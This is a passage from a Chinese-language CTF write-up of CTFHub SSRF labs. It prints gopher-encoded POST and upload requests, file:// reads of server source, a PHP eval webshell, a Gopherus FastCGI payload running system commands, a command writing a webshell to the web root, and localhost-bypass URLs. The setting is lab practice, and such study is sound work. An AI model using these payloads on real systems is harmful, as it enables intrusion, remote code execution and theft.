class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>返回</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ul><li>题目意思是要构造一个POST请求，传参key</li></ul><p>访问<code>http://127.0.0.1/flag.php</code> 发现</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=21327983b7a37abf3ace93cc0e64f15f--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。所以我们需要两次编码</p><ul><li><p><strong>构造gopher协议</strong></p><ul><li>在gopher协议中发送HTTP的数据，需要以下三步：</li></ul><p>1、构造HTTP数据包</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.构造HTTP数据包</span></span><br><span class="line">raw = <span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">key=21327983b7a37abf3ace93cc0e64f15f&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>2、URL编码、替换回车换行为%0d%0a</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL编码、替换回车换行为%0d%0a</span></span><br><span class="line">data = raw.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(data))</span><br></pre></td></tr></table></figure><p>3、发送gopher协议，有的教程说后面要加结束符<code>%0d%0a</code>，但是这道题貌似不用</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D21327983b7a37abf3ace93cc0e64f15f</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>结果</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>206</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line">  </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:43 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line">  </span><br><span class="line">ctfhub&#123;dbcc1a3f4c6fb16d610f70aa&#125;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="上传文件">上传文件</span></h4><ol><li>查看源代码</li></ol><p>发送</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>返回</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>发送</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>返回</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>得知是要构造一个表单提交。</p><ol start="2"><li>使用http协议，访问flag.php</li></ol>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>发现并没有提交的button，我们需要自己写一个</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后bp抓包</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>330</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqNWrH2XOYKqFjQzw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.pphphp&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">æäº¤</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>  编码两次结果</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gohper://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520330%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_15_7%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell.pphphp%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527shell%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span><br></pre></td></tr></table></figure><p>访问index.php抓包，构造payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">不知道为啥过不了，和网上流程都一样，不管</span><br><span class="line"></span><br><span class="line">#### fastcgi</span><br><span class="line"></span><br><span class="line">- 这里要用到**gopherus**类进行payload生成</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  python2 gopherus --exploit fastcgi</span><br><span class="line">  /var/www/html/index.php</span><br><span class="line">  ls</span><br><span class="line">  # 获得</span><br><span class="line">  gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>  然后再进行一次url编码<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure></p><ul><li><p>使用bp的repeater发送后获取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NX-Powered-By: PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">-----Made-by-SpyD3r-----</span><br><span class="line">htm</span><br></pre></td></tr></table></figure></li><li><p>然后重复上述操作，输入并进行url编码即可获取flag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">ls /flag</span><br></pre></td></tr></table></figure></li><li><p>也可以写个一句话木马上去</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> JTNDJTNGcGhwJTIwZXZhbCUyOCUyNF9QT1NUJTVCc2hlbGwlNUQlMjklM0IlM0YlM0UlMDA= | base64 -d &gt; /var/www/html/shel1.php</span><br></pre></td></tr></table></figure></li></ul><p>其中*&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php<em>可以用</em>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php*代替，就是服务器里面有的php文件即可，pear是自带的。</p><p><a href="https://www.modb.pro/db/163739">原理参考</a></p><h4><span id="redis协议">Redis协议</span></h4><ul><li><p>通过gopherus一把梭</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis</span><br><span class="line">PHPShell</span><br><span class="line">&lt;?php eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>再进行一次url编码即可</p></li></ul><h4><span id="url-bypass">URL Bypass</span></h4><p>这个题的考点与DNS解析有关，像我们平时输入的百度网址<a href="http://www.baidu.com中的www是什么意思？我们简单了解一下域名解析前缀的作用">www.baidu.com中的www是什么意思？我们简单了解一下域名解析前缀的作用</a></p><p>www：二级域名解析，以百度为例，就是<a href="http://www.baidu.com/">www.baidu.com</a></p><p>@ ：主域名解析，即@符号后面直接跟域名，如果前面有东西，会被忽略。</p><p>*：是指泛解析，是指除已添加的解析记录以外的所有主机都以此为准，以百度为例，就是 12343.baidu.com。</p><ul><li><p>这道题直接使用@跳过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://notfound.ctfhub.com@127.0.0.1:80/flag.php</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://blog.csdn.net/xhy18634297976/article/details/120895812">其他方法</a></p><h4><span id="数字ip-bypass">数字IP Bypass</span></h4><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IP地址转换</a></p><ul><li><p>方法一：通过IP地址转换，将10进制的数代替127.0.0.1即可，或者16进制前面加个0x</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=2130706433:80/flag.php</span><br><span class="line"></span><br><span class="line">http://challenge-b558d4473913b437.sandbox.ctfhub.com:10800/?url=0x7F000001:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>方法二：使用localhost</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=localhost:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>方法三；特殊地址<a href="http://0.0.0.0/">http://0/</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 